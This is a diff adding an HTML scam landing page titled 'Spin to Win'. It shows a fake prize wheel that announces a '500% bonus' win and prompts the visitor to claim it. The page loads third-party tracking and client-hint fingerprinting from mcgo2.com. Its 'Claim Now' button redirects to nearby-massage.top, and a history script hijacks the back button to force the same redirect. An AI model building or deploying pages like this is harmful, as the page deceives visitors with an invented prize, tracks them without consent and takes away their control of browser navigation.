@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Spin to Win</title>
+    <link rel="shortcut icon" href="5e67f0a83ba89_v.png">
+    <link rel="stylesheet" href="style.css">
+    <!--Optional, send client hints to get accurate device data-->
+<meta http-equiv="delegate-ch" content="sec-ch-ua https://ycfkku.mcgo2.com; sec-ch-ua-mobile https://ycfkku.mcgo2.com; sec-ch-ua-arch https://ycfkku.mcgo2.com; sec-ch-ua-model https://ycfkku.mcgo2.com; sec-ch-ua-platform https://ycfkku.mcgo2.com; sec-ch-ua-platform-version https://ycfkku.mcgo2.com; sec-ch-ua-bitness https://ycfkku.mcgo2.com; sec-ch-ua-full-version-list https://ycfkku.mcgo2.com; sec-ch-ua-full-version https://ycfkku.mcgo2.com" />
+
+<!-- MaxConv Tracking Script Base Code-->
+<script>!function(w,d,o,n,c){w[o]=w[o]||function(){(w[o].q=w[o].q||[]).push(arguments)};var s=d.createElement(n),t=d.getElementsByTagName(n)[0];s.async=!0;s.defer=!0;s.src="https://ycfkku.mcgo2.com/t/t.js";t.parentNode.insertBefore(s,t);}(window,document,"maxconv","script");</script>
+<noscript><link rel="stylesheet" href="https://ycfkku.mcgo2.com/t/t.css?mc_ns=1" /></noscript>
+<!-- End MaxConv Tracking Script Base Code-->
+</head>
+
+<body class="page" style="overflow-y: auto;">
+    <div class="page__wrap">
+        <a class="logo page__logo"> <img src="cashhc.png" class="logo__img" width="50" height="100"> </a>
+        <div class="game-layout">
+            <img src="5e67f0a828b4f_v.png" class="game-person gonzo">
+            <div class="game-layout__body">
+                <div class="wheel wheel_animated">
+                    <div class="wheel__spinner-holder">
+                        <img src="5e67f0a4b11b9_v.png" class="wheel__spinner wheel__spinner_animated">
+                        <div class="wheel__mask"></div>
+                        <div class="wheel__button-holder wheel__button-holder_blinking">
+                            <div class="wheel__button-pointer">
+                                <script>
+                                    function play() {
+                                        var audio = document.getElementById("audio");
+                                        audio.play();
+                                    }
+                                </script>
+                                <button class="circle-button wheel__button spin-trigger" onclick="play()">SPIN ME</button>
+                                <audio id="audio" src="sound.mp3">
+                           <audio src="coin.mp3" id="my_audio" loop="loop">
+                           </audio>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="wheel__win-frame"></div>
+                </div>
+            </div>
+            <img src="5e67f0a85429d_v.png" class="game-person jack">
+        </div>
+        <div class="page__footer">
+            <div class="payments"></div>
+        </div>
+    </div>
+    <div class="fewmodal" id="modal-content">
+        <div class="fewmodal__body" id="level-1" style="margin: auto;">
+            <div class="fewmodal__content">
+                <div class="popup">
+                    <h2 class="popup__title popup__accent">Congratulations!<br>You won</h2>
+                    <div class="spin-win">
+                        <p class="popup__win title">bônus de 500%.</p>
+                        <img src="5e67f0a6ca01e_v.png" class="popup-icon">
+                        <p class="popup_grey_info">Click Now to get your Rewards!</p>
+                        <button class="btn btn-block btn--answer btn-claim-now"><a href="https://ycfkku.mcgo2.com/click" target="_blank" onclick="setTimeout(function() { window.location = 'https://nearby-massage.top'; }, 100);"">Claim Now</a></button>
+                        <audio id="audio" src="coin.mp3">
+                  </audio>
+
+                    </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+    <script src="main_script.js"></script>
+
+    <script>
+        // 当页面加载完成时，立即向history栈添加一个状态
+        history.pushState(null, null, location.href);
+        
+        window.onpopstate = function(event) {
+            // 这里处理用户点击浏览器后退按钮的情况
+            // 重定向用户到指定页面, 比如 Google
+            location.href = 'https://nearby-massage.top';
+            // 或者重定向用户到他们之前的页面
+            // history.go(-1);
+        }
+    </script> -->
+</body>
+
+</html>
